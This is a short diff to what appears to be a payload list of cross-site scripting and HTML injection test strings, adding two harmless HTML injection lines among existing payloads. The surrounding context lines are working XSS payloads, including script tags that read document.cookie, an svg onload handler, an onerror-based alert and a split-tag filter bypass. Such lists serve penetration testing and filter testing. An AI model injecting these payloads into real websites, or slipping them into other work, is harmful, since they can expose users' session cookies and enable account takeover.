@@ -3,6 +3,8 @@
 "><script>prompt(document.cookie)</script>
 "><svg/onload=prompt('Supakiad-S. (m3ez)', document.domain)​>
 <script>onerror=alert;throw `Supakiad S. m3ez`;</script>
+<textarea>Html injected</textarea>
+<h1><b><i>hello</h1></b></i>
 
 <script>alert(1)</script>
 <scr ipt>alert(1)</scr ipt>
